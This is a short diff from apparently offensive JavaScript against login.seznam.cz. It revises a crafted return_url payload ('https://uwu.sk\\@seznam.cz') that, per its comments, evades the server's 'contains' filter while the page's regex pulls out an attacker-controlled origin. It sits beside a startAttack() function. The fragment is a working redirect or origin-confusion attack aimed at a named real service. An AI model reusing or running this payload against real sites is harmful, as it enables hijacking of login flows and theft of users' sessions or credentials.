@@ -17,7 +17,7 @@
         // We append /seznam.cz to the path to bypass potential 'contains' filters on the server,
         // while ensuring the JS Regex extracts only the attackerOrigin.
         const targetBase = "https://login.seznam.cz/loginDone";
-        const returnUrlPayload = "https://uwu.sk\@seznam.cz"; 
+        const returnUrlPayload = "https://uwu.sk\\@seznam.cz"; 
         const targetUrl = `${targetBase}?return_url=${encodeURIComponent(returnUrlPayload)}`;
 
         function startAttack() {
